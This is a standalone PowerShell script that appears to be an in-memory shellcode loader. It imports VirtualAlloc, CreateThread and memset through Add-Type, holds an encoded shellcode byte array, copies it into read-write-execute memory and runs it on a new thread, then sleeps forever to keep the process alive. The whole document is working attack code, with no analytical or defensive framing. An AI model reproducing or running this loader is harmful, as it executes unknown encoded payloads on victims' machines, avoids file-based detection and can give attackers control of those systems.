
$qWxSRv = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $qWxSRv -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x9d,0xa0,0x62,0xfe,0xdb,0xdf,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x83,0xc2,0x04,0x31,0x42,0x0f,0x03,0x42,0x92,0x42,0x97,0x02,0x44,0x00,0x58,0xfb,0x94,0x65,0xd0,0x1e,0xa5,0xa5,0x86,0x6b,0x95,0x15,0xcc,0x3e,0x19,0xdd,0x80,0xaa,0xaa,0x93,0x0c,0xdc,0x1b,0x19,0x6b,0xd3,0x9c,0x32,0x4f,0x72,0x1e,0x49,0x9c,0x54,0x1f,0x82,0xd1,0x95,0x58,0xff,0x18,0xc7,0x31,0x8b,0x8f,0xf8,0x36,0xc1,0x13,0x72,0x04,0xc7,0x13,0x67,0xdc,0xe6,0x32,0x36,0x57,0xb1,0x94,0xb8,0xb4,0xc9,0x9c,0xa2,0xd9,0xf4,0x57,0x58,0x29,0x82,0x69,0x88,0x60,0x6b,0xc5,0xf5,0x4d,0x9e,0x17,0x31,0x69,0x41,0x62,0x4b,0x8a,0xfc,0x75,0x88,0xf1,0xda,0xf0,0x0b,0x51,0xa8,0xa3,0xf7,0x60,0x7d,0x35,0x73,0x6e,0xca,0x31,0xdb,0x72,0xcd,0x96,0x57,0x8e,0x46,0x19,0xb8,0x07,0x1c,0x3e,0x1c,0x4c,0xc6,0x5f,0x05,0x28,0xa9,0x60,0x55,0x93,0x16,0xc5,0x1d,0x39,0x42,0x74,0x7c,0x55,0xa7,0xb5,0x7f,0xa5,0xaf,0xce,0x0c,0x97,0x70,0x65,0x9b,0x9b,0xf9,0xa3,0x5c,0xdc,0xd3,0x14,0xf2,0x23,0xdc,0x64,0xda,0xe7,0x88,0x34,0x74,0xce,0xb0,0xde,0x84,0xef,0x64,0x4a,0x80,0x67,0x47,0x23,0x8a,0x7c,0x2f,0x36,0x8b,0x97,0x97,0xbf,0x6d,0xc7,0xb7,0xef,0x21,0xa7,0x67,0x50,0x92,0x4f,0x62,0x5f,0xcd,0x6f,0x8d,0xb5,0x66,0x05,0x62,0x60,0xde,0xb1,0x1b,0x29,0x94,0x20,0xe3,0xe7,0xd0,0x62,0x6f,0x04,0x24,0x2c,0x98,0x61,0x36,0xd8,0x68,0x3c,0x64,0x4e,0x76,0xea,0x03,0x6e,0xe2,0x11,0x82,0x39,0x9a,0x1b,0xf3,0x0d,0x05,0xe3,0xd6,0x06,0x8c,0x71,0x99,0x70,0xf1,0x95,0x19,0x80,0xa7,0xff,0x19,0xe8,0x1f,0xa4,0x49,0x0d,0x60,0x71,0xfe,0x9e,0xf5,0x7a,0x57,0x73,0x5d,0x13,0x55,0xaa,0xa9,0xbc,0xa6,0x99,0x2b,0x80,0x70,0xe7,0x59,0xe8,0x40;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$qWx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($qWx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$qWx,0,0,0);for (;;){Start-sleep 60};

